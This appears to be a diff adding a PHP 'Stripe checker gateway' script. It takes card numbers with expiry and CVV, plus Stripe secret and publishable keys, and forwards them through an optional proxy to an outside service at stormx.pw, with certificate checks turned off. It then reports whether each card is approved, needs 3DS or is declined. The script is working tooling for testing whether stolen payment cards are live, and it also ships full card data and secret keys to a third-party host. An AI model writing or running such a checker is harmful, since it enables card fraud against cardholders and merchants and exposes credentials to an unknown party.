@@ -1,0 +1,85 @@
+<?php
+// Key Based Stripe Checker Gateway
+// Calls the external API at stormx.pw
+
+header('Content-Type: text/plain');
+
+$card = $_POST['cc'] ?? $_GET['cc'] ?? '';
+$sk = $_POST['sk'] ?? $_GET['sk'] ?? '';
+$pk = $_POST['pk'] ?? $_GET['pk'] ?? '';
+$amount = $_POST['amount'] ?? $_GET['amount'] ?? '1.00';
+$key = $_POST['api_key'] ?? $_GET['api_key'] ?? 'Darkboy';
+$proxy = $_POST['proxy'] ?? $_GET['proxy'] ?? '';
+
+if (empty($card)) {
+    echo "ERROR: No card provided";
+    exit;
+}
+
+if (empty($sk) || empty($pk)) {
+    echo "ERROR: Stripe keys required (sk and pk)";
+    exit;
+}
+
+// Parse card format
+$parts = explode('|', $card);
+if (count($parts) < 4) {
+    echo "DECLINED: Invalid card format. Use: number|month|year|cvv";
+    exit;
+}
+
+list($cardNumber, $month, $year, $cvv) = $parts;
+
+// Build the API URL
+$apiUrl = "https://skbased.stormx.pw/skbased";
+$params = [
+    'key' => $key,
+    'sk' => $sk,
+    'pk' => $pk,
+    'amount' => $amount,
+    'cc' => "{$cardNumber}|{$month}|{$year}|{$cvv}"
+];
+
+$url = $apiUrl . '?' . http_build_query($params);
+
+// Make the request with optional proxy
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+
+if (!empty($proxy)) {
+    curl_setopt($ch, CURLOPT_PROXY, $proxy);
+}
+
+$response = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($httpCode !== 200) {
+    echo "DECLINED: API request failed (HTTP $httpCode)";
+    exit;
+}
+
+// Parse response
+$result = json_decode($response, true);
+
+if ($result && isset($result['status'])) {
+    $status = strtoupper($result['status']);
+    $message = $result['message'] ?? '';
+    
+    if ($status === 'APPROVED' || $status === 'LIVE' || $status === 'SUCCESS') {
+        echo "APPROVED: " . $message;
+    } elseif ($status === '3DS' || strpos($message, '3DS') !== false) {
+        echo "3DS: " . $message;
+    } else {
+        echo "DECLINED: " . ($message ?: 'Card declined');
+    }
+} elseif ($result && isset($result['error'])) {
+    echo "DECLINED: " . $result['error'];
+} else {
+    echo "DECLINED: Invalid response from API";
+}
+?>
